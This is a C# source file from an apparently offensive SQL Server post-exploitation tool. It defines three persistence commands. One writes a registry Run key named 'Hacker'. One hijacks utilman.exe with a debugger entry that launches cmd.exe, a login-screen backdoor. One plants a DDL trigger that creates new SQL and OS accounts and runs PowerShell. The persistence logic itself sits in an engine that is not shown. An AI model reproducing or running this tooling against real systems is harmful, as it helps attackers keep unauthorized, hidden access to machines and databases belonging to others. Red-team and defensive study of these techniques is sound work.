using System.Collections.Generic;
using System.Linq;
using SharpUpSQL.Commands;
using SharpUpSQL.Common;
using SharpUpSQL.Core.Auth;

namespace SharpUpSQL.Persistence
{
    public sealed class GetSqlPersistRegRunCommand : SharpUpSqlCommandBase
    {
        public override string Name { get { return "Get-SQLPersistRegRun"; } }

        public override IEnumerable<object> Execute(SharpUpSqlContext context)
        {
            return CommonCommandHelper.ForEachTarget(context, (instance, options, suppressVerbose) =>
                PersistenceEngine.GetSqlPersistRegRun(
                    options,
                    instance,
                    GetArg(context, "Name") ?? "Hacker",
                    GetArg(context, "Command") ?? "PowerShell.exe -C \"Write-Host hacker | Out-File C:\\temp\\iamahacker.txt\"",
                    context.Verbose,
                    suppressVerbose).Cast<object>());
        }
    }

    public sealed class GetSqlPersistRegDebuggerCommand : SharpUpSqlCommandBase
    {
        public override string Name { get { return "Get-SQLPersistRegDebugger"; } }

        public override IEnumerable<object> Execute(SharpUpSqlContext context)
        {
            return CommonCommandHelper.ForEachTarget(context, (instance, options, suppressVerbose) =>
                PersistenceEngine.GetSqlPersistRegDebugger(
                    options,
                    instance,
                    GetArg(context, "FileName") ?? "utilman.exe",
                    GetArg(context, "Command") ?? @"c:\windows\system32\cmd.exe",
                    context.Verbose,
                    suppressVerbose).Cast<object>());
        }
    }

    public sealed class GetSqlPersistTriggerDdlCommand : SharpUpSqlCommandBase
    {
        public override string Name { get { return "Get-SQLPersistTriggerDDL"; } }

        public override IEnumerable<object> Execute(SharpUpSqlContext context)
        {
            return CommonCommandHelper.ForEachTarget(context, (instance, options, suppressVerbose) =>
                PersistenceEngine.GetSqlPersistTriggerDdl(
                    options,
                    instance,
                    GetArg(context, "NewSqlUser"),
                    GetArg(context, "NewSqlPass"),
                    GetArg(context, "NewOsUser"),
                    GetArg(context, "NewOsPass"),
                    GetArg(context, "PsCommand"),
                    GetSwitch(context, "Remove"),
                    context.Verbose,
                    suppressVerbose).Cast<object>());
        }
    }
}
